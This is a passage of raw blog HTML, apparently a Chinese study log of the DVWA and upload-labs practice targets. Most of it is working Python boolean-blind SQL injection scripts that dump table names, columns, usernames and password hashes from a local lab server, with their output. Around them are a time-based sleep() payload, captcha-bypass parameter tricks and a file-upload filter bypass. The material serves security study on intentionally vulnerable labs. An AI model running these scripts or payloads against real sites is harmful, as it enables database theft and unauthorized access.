class="number">50</span>):</span><br><span class="line">        getPayload = startStr + payload +str(j)+endStr</span><br><span class="line">        tempurl = url + getPayload</span><br><span class="line">        content = requests.get(tempurl,headers=header).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">            tablelength = j</span><br><span class="line">            <span class="comment">#print(tempurl)</span></span><br><span class="line">            print(<span class="string">"表"</span>+str(i+<span class="number">1</span>)+<span class="string">"长度为："</span>+str(tablelength))</span><br><span class="line">            <span class="comment"># 表名</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,tablelength+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                    payload = <span class="string">"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),"</span>+str(k)+<span class="string">",1))="</span></span><br><span class="line">                    getPayload = startStr + payload +str(l)+endStr</span><br><span class="line">                    tempurl = url + getPayload</span><br><span class="line">                    content = requests.get(tempurl,headers=header).text</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">                        table_name += chr(l)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">            print(<span class="string">"表"</span>+str(i+<span class="number">1</span>)+<span class="string">"名为："</span>+table_name)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据库名长度为：4</span><br><span class="line">当前数据库名：dvwa</span><br><span class="line">dvwa数据库有2个表</span><br><span class="line">表1长度为：9</span><br><span class="line">表1名为：guestbook</span><br><span class="line">表2长度为：5</span><br><span class="line">表2名为：users</span><br></pre></td></tr></table></figure><ul><li>字段信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=n580kqns8kkr29ov6e2hho0hd6; security=low'</span>&#125;</span><br><span class="line">url = <span class="string">'http://192.168.1.113/vulnerabilities/sqli_blind/?id='</span></span><br><span class="line">startStr = <span class="string">"1'and "</span></span><br><span class="line">endStr = <span class="string">" --+&amp;Submit=Submit#"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># users表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#存在标志</span></span><br><span class="line">flag = <span class="string">'User ID exists in the database.'</span></span><br><span class="line"><span class="comment"># 1.字段数目</span></span><br><span class="line">payload = <span class="string">"(select count(column_name) from information_schema.columns where table_name= 'users')="</span> <span class="comment">#查询语句</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    getPayload = startStr + payload +str(i)+endStr</span><br><span class="line">    tempurl = url + getPayload</span><br><span class="line">    content = requests.get(tempurl,headers=header).text </span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">        columnNum = i</span><br><span class="line">        print(<span class="string">'字段数为：'</span>+str(columnNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#2.字段名类似于爆表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,columnNum):</span><br><span class="line">    table_name = <span class="string">''</span></span><br><span class="line">    payload = <span class="string">"length(substr((select column_name from information_schema.columns where table_name= 'users' limit "</span>+str(i)+<span class="string">",1),1))="</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        getPayload = startStr + payload +str(j)+endStr</span><br><span class="line">        tempurl = url + getPayload</span><br><span class="line">        content = requests.get(tempurl,headers=header).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">            columnNumlength = j</span><br><span class="line">            <span class="comment">#print(tempurl)</span></span><br><span class="line">            print(<span class="string">"字段"</span>+str(i+<span class="number">1</span>)+<span class="string">"长度为："</span>+str(columnNumlength))</span><br><span class="line">            <span class="comment"># 字段</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,columnNumlength+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                    payload = <span class="string">"ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit "</span>+str(i)+<span class="string">",1),"</span>+str(k)+<span class="string">",1))="</span></span><br><span class="line">                    getPayload = startStr + payload +str(l)+endStr</span><br><span class="line">                    tempurl = url + getPayload</span><br><span class="line">                    content = requests.get(tempurl,headers=header).text</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">                        table_name += chr(l)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">            print(<span class="string">"字段"</span>+str(i+<span class="number">1</span>)+<span class="string">"名为："</span>+table_name)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">字段数为：8</span><br><span class="line">字段1长度为：7</span><br><span class="line">字段1名为：user_id</span><br><span class="line">字段2长度为：10</span><br><span class="line">字段2名为：first_name</span><br><span class="line">字段3长度为：9</span><br><span class="line">字段3名为：last_name</span><br><span class="line">字段4长度为：4</span><br><span class="line">字段4名为：user</span><br><span class="line">字段5长度为：8</span><br><span class="line">字段5名为：password</span><br><span class="line">字段6长度为：6</span><br><span class="line">字段6名为：avatar</span><br><span class="line">字段7长度为：10</span><br><span class="line">字段7名为：last_login</span><br><span class="line">字段8长度为：12</span><br><span class="line">字段8名为：failed_login</span><br></pre></td></tr></table></figure><ul><li>字段值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=n580kqns8kkr29ov6e2hho0hd6; security=low'</span>&#125;</span><br><span class="line">url = <span class="string">'http://192.168.1.113/vulnerabilities/sqli_blind/?id='</span></span><br><span class="line">startStr = <span class="string">"1'and "</span></span><br><span class="line">endStr = <span class="string">" --+&amp;Submit=Submit#"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#字段4名为：user</span></span><br><span class="line"><span class="comment">#字段5名为：password</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#存在标志</span></span><br><span class="line">flag = <span class="string">'User ID exists in the database.'</span></span><br><span class="line"><span class="comment"># 1.字段中记录(行)数量</span></span><br><span class="line">payload = <span class="string">"(select count(*) from users)="</span> <span class="comment">#查询语句</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    getPayload = startStr + payload +str(i)+endStr</span><br><span class="line">    tempurl = url + getPayload</span><br><span class="line">    content = requests.get(tempurl,headers=header).text</span><br><span class="line">    <span class="comment">#print(tempurl)</span></span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">        rowNum = i</span><br><span class="line">        print(<span class="string">'users字段行数为：'</span>+str(rowNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 先爆每个字段值长度，以便控制循环，提高效率，也可省略此步骤，但要保证循环大于字段长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,rowNum+<span class="number">1</span>):</span><br><span class="line">    keys = [<span class="string">'user'</span>,<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        rowContent  = <span class="string">''</span></span><br><span class="line">        payload = <span class="string">"length(substr((select "</span>+key+<span class="string">" from users limit "</span>+str(i)+<span class="string">",1),1))="</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            getPayload = startStr + payload +str(j)+endStr</span><br><span class="line">            tempurl = url + getPayload</span><br><span class="line">            content = requests.get(tempurl,headers=header).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">                rowLen = j</span><br><span class="line">                <span class="comment">#print(tempurl)</span></span><br><span class="line">                print(<span class="string">"字段值"</span>+key+<span class="string">"长度为："</span>+str(rowLen))</span><br><span class="line">                <span class="comment"># 字段值</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,rowLen+<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                        payload = <span class="string">"ascii(substr((select "</span>+key+<span class="string">" from users limit "</span>+str(i)+<span class="string">",1),"</span>+str(k)+<span class="string">",1))="</span></span><br><span class="line">                        getPayload = startStr + payload +str(l)+endStr</span><br><span class="line">                        tempurl = url + getPayload</span><br><span class="line">                        content = requests.get(tempurl,headers=header).text</span><br><span class="line">                        <span class="comment">#print(tempurl)</span></span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">                            rowContent += chr(l)</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                print(<span class="string">"字段"</span>+key+<span class="string">"值为："</span>+rowContent)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">users字段行数为：5</span><br><span class="line">字段值user长度为：5</span><br><span class="line">字段user值为：admin</span><br><span class="line">字段值password长度为：32</span><br><span class="line">字段password值为：5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">字段值user长度为：7</span><br><span class="line">字段user值为：gordonb</span><br><span class="line">字段值password长度为：32</span><br><span class="line">字段password值为：e99a18c428cb38d5f260853678922e03</span><br><span class="line">字段值user长度为：4</span><br><span class="line">字段user值为：1337</span><br><span class="line">字段值password长度为：32</span><br><span class="line">字段password值为：8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line">字段值user长度为：5</span><br><span class="line">字段user值为：pablo</span><br><span class="line">字段值password长度为：32</span><br><span class="line">字段password值为：0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line">字段值user长度为：6</span><br><span class="line">字段user值为：smithy</span><br><span class="line">字段值password长度为：32</span><br><span class="line">字段password值为：5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure><ul><li>时间盲注</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用基于时间延迟的盲注进行操作。此时，需要结合if函数和sleep()函数来测试不同判断条件导致的延迟效果差异，如：1&apos; and if(length(database())&gt;10,sleep(5),1) #</span><br><span class="line">if条件中即数据库的库、表、字段、字段值的获取和数值大小比较，若服务器响应时执行了sleep()函数，则判断if中的条件为真，否则为假。</span><br></pre></td></tr></table></figure><h4 id="参考文章-3"><a href="#参考文章-3" class="headerlink" title="参考文章"></a>参考文章</h4><p>1.<a href="https://blog.csdn.net/qq_42181428/article/details/88075784" rel="external nofollow" target="_blank">以dvwa为例学习简单sql布尔盲注的详细脚本</a></p><p>2.<a href="https://www.jianshu.com/p/757626cec742" rel="external nofollow" target="_blank">DVWA全等级SQL Injection(Blind)盲注–手工测试过程解析</a></p><h3 id="medium级别-6"><a href="#medium级别-6" class="headerlink" title="medium级别"></a>medium级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $id ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码中有 <a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" rel="external nofollow" target="_blank"><code>mysql_real_escape_string</code></a> 对特殊字符等进行转义，所以就用不了<code>&#39;</code>或<code>&quot;</code>之类的符号，带有引号包含字符串的字段值，可以转换成16进制的形式进行绕过限制，从而提交到数据库进行查询</p><h3 id="High级别-1"><a href="#High级别-1" class="headerlink" title="High级别"></a>High级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>高级是通过cookies 传参，还有个<code>LIMIT 1</code> 限制了条数，再有一个就是查询失败的时候会随机 sleep。对于LIMIT 1的限制输出记录数目，可以利用<code>#</code>注释其限制；</p><h2 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h2><h3 id="DVWA报错"><a href="#DVWA报错" class="headerlink" title="DVWA报错"></a><code>DVWA</code>报错</h3><p>报错内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reCAPTCHA API key missing from config file error</span><br></pre></td></tr></table></figure><p>方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在config.inc.php文件中找到下面代码并修改至即可</span><br><span class="line"></span><br><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ] = &apos; &apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos; &apos;;</span><br><span class="line"></span><br><span class="line">修改为</span><br><span class="line"></span><br><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ] = &apos;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&apos;;</span><br></pre></td></tr></table></figure></p><p>参考博客：<a href="https://www.jianshu.com/p/9ef5f9b0844f" rel="external nofollow" target="_blank">DVWA报错解决</a></p><ul><li>docker搭建科学上网后访问不了靶场。</li></ul><p><a href="https://blog.csdn.net/liweibin812/article/details/86497254" rel="external nofollow" target="_blank">学习思路</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">low：直接提交，因为没输验证码，显示The CAPTCHA was incorrect. Please try again.，用burpsuite抓包，试下将step改为“2”，返回修改密码成功。</span><br><span class="line"></span><br><span class="line">medium：按照low的操作提交，显示You have not passed the CAPTCHA，应该是下面又做了某个参数验证。看下源码，需要验证passed_captcha这个参数的的值，它是在第一步的时候提交隐藏的表单的时候，提交了一个passed_captcha，值为true。接下来直接抓包，依旧step设为2并在&amp;Change=Change参数后面新增一个passed_captcha=true，即&amp;Change=Change&amp;passed_captcha=true。返回修改密码成功。</span><br><span class="line"></span><br><span class="line">high：resp参数是谷歌返回的验证结果，只要resp为真或者后面那两个参数等于正确的值都算通过验证码，resp这个我们无法预测，但后面那两个参数是可控的。抓包，在&amp;Change=Change参数后面新增一个g-recaptcha-response=hidd3n_valu3，即&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3。并将请求头的User-Agent的值改为reCAPTCHA。返回修改密码成功。</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/f07e510ce189" rel="external nofollow" target="_blank">DVWA 之insecure captcha学习</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 靶场练习 </tag>
            
            <tag> DVWA </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 命令注入 </tag>
            
            <tag> 跨站请求伪造 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 不安全的验证码 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> SQL盲注 </tag>
            
            <tag> 反射型xss </tag>
            
            <tag> 存储型xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs学习</title>
      <link href="/caa1643c.html"/>
      <url>/caa1643c.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/c0ny1/upload-labs/master/doc/index.jpg" alt=""> </p><a id="more"></a><h1 id="upload-labs学习"><a href="#upload-labs学习" class="headerlink" title="upload-labs学习"></a><code>upload-labs</code>学习</h1><p><strong><code>upload-labs</code>是一个使用<code>php</code>语言编写的，专门收集渗透测试和<code>CTF</code>中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</strong> </p><h2 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h2><p>项目地址：<a href="https://github.com/c0ny1/upload-labs" rel="external nofollow" target="_blank">下载</a></p><p><code>upload-labs-writeup</code>:<a href="https://github.com/LandGrey/upload-labs-writeup" rel="external nofollow" target="_blank">查看</a></p><p> Upload-labs通关手册 :<a href="https://xz.aliyun.com/t/2435" rel="external nofollow" target="_blank">先知社区</a></p><p> li1m总结：<a href="https://li1m.github.io/2019/11/19/upload-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/#more" rel="external nofollow" target="_blank">writeup</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="靶机包含漏洞类型分类"><a href="#靶机包含漏洞类型分类" class="headerlink" title="靶机包含漏洞类型分类"></a>靶机包含漏洞类型分类</h3><p><img src="https://raw.githubusercontent.com/c0ny1/upload-labs/master/doc/mind-map.png" alt=""></p><h3 id="如何判断上传漏洞类型"><a href="#如何判断上传漏洞类型" class="headerlink" title="如何判断上传漏洞类型?"></a>如何判断上传漏洞类型?</h3><p> <img src="https://raw.githubusercontent.com/c0ny1/upload-labs/master/doc/sum_up.png" alt=""> </p><p>学习上传思路，docker搭建的靶场可能不能成功<code>getshell</code></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p> 前端绕过，在前端<code>js</code>判断函数中加上可以上传<code>php</code>文件或者<code>bp</code>抓包改后缀</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif|.php"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 